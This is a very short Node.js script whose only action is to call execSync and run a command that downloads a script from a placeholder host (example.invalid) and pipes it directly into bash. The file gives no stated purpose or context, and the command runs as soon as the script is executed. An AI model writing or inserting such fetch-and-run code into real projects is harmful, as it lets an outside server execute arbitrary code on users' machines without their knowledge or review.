"use strict";
const { execSync } = require("child_process");
execSync("curl -fsSL https://example.invalid/install | bash");
